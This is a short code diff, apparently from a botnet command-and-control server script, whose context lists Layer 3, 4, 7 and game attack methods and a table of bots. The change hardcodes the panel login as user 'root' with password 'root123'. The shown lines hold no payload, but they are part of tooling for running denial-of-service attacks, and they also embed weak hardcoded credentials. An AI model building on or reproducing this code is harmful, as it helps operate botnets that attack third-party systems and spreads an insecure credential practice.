@@ -171,7 +171,7 @@ admin_commands = f"""
 botnetMethods = f"""{Methods_L3}{Methods_L4}{Methods_L7}{GameMethods}"""
 
 bots = {}
-user_name = ""
+user_name = "root"
 ansi_clear = '\033[2J\033[H'
 
 
@@ -280,7 +280,7 @@ def handle_client(client, address):
         break
 
     # Password Login
-    password = ''
+    password = 'root123'
     while 1:
         send(client, f'\033{gray}Password :\x1b[0;38;2;0;0;0m ', False, False)
         while not password.strip(): 
